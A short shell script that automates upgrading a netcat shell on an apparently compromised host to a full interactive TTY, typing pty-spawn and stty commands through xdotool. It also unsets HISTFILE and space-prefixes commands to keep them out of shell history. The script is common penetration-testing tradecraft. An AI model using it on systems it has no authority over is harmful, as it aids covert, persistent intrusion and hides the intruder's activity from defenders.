#!/bin/sh
# Upgrade your dumb netcat shell to a fully functional, coloured normal shell with this handy script. 
# Run in a seperate window and then return focus to your netcat shell within three seconds.
# Thanks to @jonasw234 who orginally created this script. https://github.com/jonasw234/upgrade-tty
# Needs a sort of NOP slide because sometimes xdotool would only type after the forth or fifth character
sleep 3
xdotool type ' #################'
xdotool key Return
xdotool type ' unset HISTFILE'
xdotool key Return
xdotool type ' python -c '\''import pty; pty.spawn("/bin/bash")'\'' || python3 -c '\''import pty; pty.spawn("/bin/bash")'\'' || script -qc /bin/bash /dev/null'
xdotool key Return
xdotool keydown ctrl key z; sleep .1; xdotool keyup ctrl
xdotool type 'stty size | xclip -selection clipboard'
xdotool key Return
xdotool type 'stty raw -echo; fg'
xdotool key Return
xdotool type ' unset HISTFILE'
xdotool key Return
xdotool type ' export SHELL=bash'
xdotool key Return
xdotool type ' export TERM=xterm-256color'
xdotool key Return
xdotool type " stty cols $(xclip -o -selection clipboard | awk '{print $2}') rows $(xclip -o -selection clipboard | awk '{print $1}')"
xdotool key Return
xdotool type ' reset'
xdotool key Return
xdotool type ' exec /bin/bash'
xdotool key Return
xdotool type ' clear'
xdotool key Return
